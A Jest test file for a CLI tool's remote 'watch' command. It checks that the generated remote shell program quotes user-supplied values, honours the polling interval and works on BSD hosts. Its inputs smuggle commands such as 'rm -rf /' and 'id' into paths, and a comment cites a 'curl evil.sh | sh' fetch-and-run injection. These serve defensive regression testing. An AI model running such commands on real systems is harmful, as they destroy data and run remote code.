import { WatchCommand } from '../../src/commands/watch.js';

/**
 * The shell program `watch` sends to a remote target.
 *
 * It is assembled as text, so every value the operator supplied is a way
 * into that text — and unlike the local paths, what runs here runs on the
 * far side, with whatever credentials the target carries.
 */
describe('the remote watch program', () => {
  const build = (paths: string[], options: Record<string, unknown> = {}): string => {
    const command = new WatchCommand() as unknown as {
      buildRemoteWatchCommand(p: string[], o: Record<string, unknown>): string;
    };
    return command.buildRemoteWatchCommand(paths, options);
  };

  describe('values the operator supplied', () => {
    it('cannot end the command and start another', () => {
      // `xec watch host '/srv; curl evil.sh | sh'` ran the second half on
      // the remote host. The path was spliced in raw.
      const program = build(['/srv; rm -rf /']);

      // Every occurrence must be inside quotes: same count either way
      // means none of them escaped into a position the shell would act on.
      const raw = program.split('/srv; rm -rf /').length - 1;
      const quoted = program.split("'/srv; rm -rf /'").length - 1;

      expect(raw).toBeGreaterThan(0);
      expect(quoted).toBe(raw);
    });

    it('survives a quote in a path', () => {
      const program = build(["/srv/it's"]);

      // Quoted, whatever the quoting scheme: the raw sequence that would
      // have closed the quote early must not appear.
      expect(program).not.toMatch(/[^\\']'s/);
    });

    it('quotes patterns', () => {
      const program = build(['/srv'], { pattern: ['*.ts; id'] });

      expect(program).not.toContain('-name *.ts; id');
    });

    it('quotes exclusions', () => {
      const program = build(['/srv'], { exclude: ["node_modules'; id; '"] });

      expect(program).not.toContain("--exclude 'node_modules'; id; ''");
    });

    it('leaves an ordinary path readable', () => {
      const program = build(['/srv/app']);

      expect(program).toContain('/srv/app');
    });

    it('echoes a quoted path as words, not as a quoted string', () => {
      const program = build(["/srv/needs quoting"]);

      expect(program).toContain("echo '/srv/needs quoting' MODIFY");
      expect(program).not.toContain('MODIFY"');
    });

    it('reports a changed path without the quotes it was sent with', () => {
      // The fallback echoes the path back for the client to parse. Inside
      // a double-quoted string the single quotes printed literally, and
      // the change was reported as a file named `'/srv/app'`.
      const program = build(['/srv/app']);

      // The tokens are echoed as separate shell words. Wrapped in double
      // quotes, the single quotes printed literally and the change was
      // reported in a file named `'/srv/app'`.
      expect(program).toContain('echo /srv/app MODIFY');
      expect(program).not.toContain('MODIFY"');
    });
  });

  describe('the polling interval', () => {
    it('is the one that was asked for', () => {
      // `--interval` was parsed, validated, and then ignored: the remote
      // loop slept for a hardcoded second.
      const program = build(['/srv'], { interval: '5000' });

      expect(program).toContain('sleep 5');
      expect(program).not.toContain('sleep 1;');
    });

    it('falls back to a second when none was given', () => {
      expect(build(['/srv'])).toContain('sleep 1');
    });

    it('never sleeps for zero', () => {
      // `sleep 0` in a `while true` loop is a busy loop on someone else's
      // machine.
      const program = build(['/srv'], { interval: '10' });

      expect(program).not.toMatch(/sleep 0\b/);
      expect(program).toContain('sleep 1');
    });

    it('ignores a value that is not a number', () => {
      expect(build(['/srv'], { interval: 'soon' })).toContain('sleep 1');
    });
  });

  describe('hosts without inotify', () => {
    it('reads mtime in a form BSD and macOS also understand', () => {
      // `stat -c '%Y'` is GNU only. On BSD it fails, the loop compared two
      // empty strings forever, and the watch silently never fired.
      const program = build(['/srv']);

      expect(program).toContain("stat -c '%Y'");
      expect(program).toContain("stat -f '%m'");
    });

    it('still prefers inotifywait when it is there', () => {
      expect(build(['/srv'])).toContain('command -v inotifywait');
    });
  });
});
